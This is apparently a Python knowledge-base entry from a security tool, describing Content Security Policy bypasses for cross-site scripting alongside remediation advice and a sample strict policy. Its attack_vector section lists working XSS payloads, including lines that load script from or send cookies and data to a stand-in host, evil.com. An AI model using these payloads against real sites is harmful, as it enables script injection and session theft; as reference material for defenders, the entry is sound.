#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: CSP Bypass Techniques
"""

DETAILS = {
    "title": "Content Security Policy (CSP) Bypass for XSS",
    "severity": "critical",
    "cvss_score": 8.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79", "CWE-693"],
    "owasp": ["A03:2021", "A05:2021"],
    "tags": ["xss", "csp", "bypass", "policy", "nonce", "hash", "unsafe-inline"],
    "description": """
Content Security Policy (CSP) is a security header designed to prevent XSS. However,
misconfigurations and advanced techniques can bypass CSP protections.

SEVERITY: CRITICAL
CSP bypasses are highly valuable as they defeat the primary XSS defense mechanism.
Many real-world CSPs are misconfigured and bypassable.
""",
    "attack_vector": """
UNSAFE-EVAL ABUSE:
CSP: script-src 'unsafe-eval'
Payload: <img src=x onerror="eval('alert(1)')">

BASE-URI HIJACK:
CSP: missing base-uri
<base href="https://evil.com/"><script src="/script.js"></script>

JSONP ENDPOINT:
CSP: script-src cdn.example.com
<script src="https://cdn.example.com/jsonp?callback=alert"></script>

ANGULAR BYPASS:
CSP: script-src 'unsafe-eval'
{{constructor.constructor('alert(1)')()}}

OBJECT-SRC DATA:
CSP: object-src 'self'
<object data="data:text/html,<script>alert(1)</script>">

SCRIPT GADGETS:
<div data-bind="value: constructor.constructor('alert(1)')()">

NONCE REUSE:
<script nonce="REUSED_NONCE">attacker_code</script>

DANGLING MARKUP:
<img src="https://evil.com/?cookie=

PREFETCH/PRELOAD:
<link rel=prefetch href="https://evil.com/?data=

STRICT-DYNAMIC BYPASS:
<script nonce="valid">document.body.innerHTML='<script>alert(1)<\\/script>'</script>

IFRAME SRCDOC:
<iframe srcdoc="<script>alert(1)</script>">
""",
    "remediation": """
STRONG CSP POLICY:

Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  object-src 'none';
  upgrade-insecure-requests;

BEST PRACTICES:
1. Use nonces with strict-dynamic
2. Avoid 'unsafe-inline' and 'unsafe-eval'
3. Set base-uri to 'none' or 'self'
4. Block object-src
5. Use report-uri for monitoring
6. Test with CSP Evaluator

OWASP REFERENCES:
- CWE-693: Protection Mechanism Failure
- CSP Cheat Sheet
""",
}
